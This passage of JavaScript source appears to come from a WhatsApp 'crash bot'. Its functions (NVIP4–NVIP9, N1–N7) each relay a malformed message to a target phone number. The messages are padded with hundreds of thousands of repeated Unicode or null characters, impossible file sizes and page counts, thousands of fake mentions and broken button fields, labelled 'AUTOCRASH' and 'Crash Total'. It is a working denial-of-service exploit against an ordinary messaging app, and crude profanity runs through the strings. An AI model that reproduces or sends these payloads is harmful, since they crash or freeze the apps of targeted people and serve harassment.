              sourceId: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: ` 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰     - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await zephy.relayMessage(target, messagePayload, {
    participant: { jid: target},
  });
}

async function NVIP4(nomor) {
     let target = nomor
     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: ""
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await zephy.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }

async function NVIP5(target) {
      let sections = [];

      for (let i = 0; i < 1; i++) {
        let largeText = "ꦾ".repeat(1);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒  ",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              },
            },
          },
        },
      };

      await zephy.relayMessage(target, message, {
        participant: { jid: target },
      });
    }

async function NVIP6(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒ 𐎟`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒ 𐎟" + "ꦾ".repeat(150000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ALWAYSAQIOO" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Alwaysaqioo The Juftt️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    zephy.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}

async function NVIP7(target) {
 let virtex = "🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒ 𐎟";
   zephy.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𝐈𝐍𝐃𝐈Σ𝐓𝐈𝐕𝚵 𝐅𝐋𝚯𝚯𝐃𝐁𝐔𝐑𝐒𝐇" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝙏𝙝𝙖𝙣" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };

async function NVIP8(target) {
var etc = generateWAMessageFromContent(target, ({
  'listMessage': {
    'title': "‌AUTOCRASH" + "ꦻ".repeat(777777) + "\u200b".repeat(88888) + '~@25~'.repeat(55555),
        'footerText': 'CRASH',
        'buttonText': 'AUTOCRASH',
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'Detech',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'BauGacor',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target });
await zephy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function NVIP9(target) {
  try {
    await ctx.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒ 𐎟\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function N1(target, ptcp = true) {
  const jids = `_*~@8~*_\n`.repeat(10500);
  const ui = 'ꦽ'.repeat(55555);

  await zephy.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: 'Aku nak Coli' + ui + jids,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
async function N2(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "AmbatakumCrt." + "\u0000".repeat(77777) + "@8".repeat(77777),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await zephy.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function N3(target, Ptcp = true) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Skibidi Bintang10." + "ꦽ".repeat(50000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: zephy.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "Vampire File",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "Persetan Dengan Cinta, Hidup Dalam Kegelapan.",
                },
                contentText: '༑ Crash Total - ( Draculaxtzy ) "👋"',
                footerText: "Di Dukung Oleh ©WhatsApp.",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(550000),
                    buttonText: {
                      displayText: "Oyyy Lu Gak teraweh yaaa??",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: CrashVamp,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/Whhwhahwha",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: 'Dracula?',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "©Originial_Bug",
              thumbnail: CrashVamp,
              sourceUrl: "Terawehsono",
              sourceId: "Dracula - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `Whahhhaa 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "P Ada dracula™",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await zephy.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}
async function N4(target, Ptcp = true) {
    let virtex = "Assalamualaikum" + "ꦾ".repeat(90000) + "@8".repeat(90000);
    await zephy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "Wkwk.",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function N5(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "Jwab cuki" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Dracula",
                    },
                ],
            },
        };

        await zephy.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
async function N6(target, Ptcp = true) {
  try {
    await zephy.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "Banggg Aku hamill‎‏‎‏‎‏⭑̤\n" +
                  "\u0018".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Dracula",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function N7(target, Ptcp = true) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Udah adzan bg." + "\u0000".repeat(50000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: zephy.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "Vampire File",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "Persetan Dengan Cinta, Hidup Dalam Kegelapan.",
                },
                contentText: '༑ Crash Total - ( Vampire_Official ) "👋"',
                footerText: "Di Dukung Oleh ©WhatsApp.",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(55000),
                    buttonText: {
                      displayText: "Vampire Crasher",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: CrashVamp,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/Vampiresagara",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! P',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "©Originial_Bug",
              thumbnail: CrashVamp,
              sourceUrl: "Tetaplah Menjadi Bodoh...",
              sourceId: "Dracula - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `Bakaa 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "By : Whhwhahwha™",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
